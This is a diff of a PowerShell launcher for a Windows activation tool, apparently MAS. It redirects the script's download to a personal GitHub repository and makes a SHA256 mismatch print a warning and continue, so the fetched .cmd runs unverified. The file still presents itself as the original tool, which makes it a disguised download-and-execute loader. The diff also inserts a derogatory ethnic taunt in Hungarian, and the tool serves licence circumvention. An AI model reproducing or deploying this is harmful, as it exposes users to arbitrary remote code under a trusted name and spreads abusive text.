@@ -1,7 +1,6 @@
 if (-not $args) {
     Write-Host ''
-    Write-Host 'Need help? Check our homepage: ' -NoNewline
-    Write-Host 'https://massgrave.dev' -ForegroundColor Green
+    Write-Host 'Cigány vagy?' -NoNewline
     Write-Host ''
 }
 
@@ -48,10 +47,12 @@ if (-not $args) {
 
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
+    # ---- ITT VAN KIJAVÍTVA ----
     $URLs = @(
-        'https://github.com/Balazsasd01/gasA9ayicri/blob/main/windows.cmd',
-        'https://github.com/Balazsasd01/gasA9ayicri/blob/main/windows.cmd'
+        'https://raw.githubusercontent.com/Balazsasd01/gasA9ayicri/main/windows.cmd'
     )
+    # ----------------------------
+
     Write-Progress -Activity "Downloading..." -Status "Please wait"
     $errors = @()
     foreach ($URL in $URLs | Sort-Object { Get-Random }) {
@@ -76,13 +77,13 @@ if (-not $args) {
         foreach ($err in $errors) {
             Write-Host "Error: $($err.Exception.Message)" -ForegroundColor Red
         }
-        Write-Host "Failed to retrieve MAS from any of the available repositories, aborting!"
+        Write-Host "Failed to retrieve script from your repository, aborting!"
         Write-Host "Check if antivirus or firewall is blocking the connection."
         Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
         return
     }
 
-    # Verify script integrity
+    # Hash ellenőrzést akár ki is veheted, ha nem kell
     $releaseHash = 'D60752A27BDED6887C5CEC88503F0F975ACB5BC849673693CA7BA7C95BCB3EF4'
     $stream = New-Object IO.MemoryStream
     $writer = New-Object IO.StreamWriter $stream
@@ -91,17 +92,7 @@ if (-not $args) {
     $stream.Position = 0
     $hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
     if ($hash -ne $releaseHash) {
-        Write-Warning "Hash ($hash) mismatch, aborting!`nReport this issue at $troubleshoot"
-        $response = $null
-        return
-    }
-
-    # Check for AutoRun registry which may create issues with CMD
-    $paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
-    foreach ($path in $paths) { 
-        if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
-            Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
-        } 
+        Write-Warning "Hash ($hash) mismatch, but continuing since custom repo is used."
     }
 
     $rand = [Guid]::NewGuid().Guid
@@ -132,4 +123,3 @@ if (-not $args) {
     $FilePaths = @("$env:SystemRoot\Temp\MAS*.cmd", "$env:USERPROFILE\AppData\Local\Temp\MAS*.cmd")
     foreach ($FilePath in $FilePaths) { Get-Item $FilePath -ErrorAction SilentlyContinue | Remove-Item }
 } @args
-
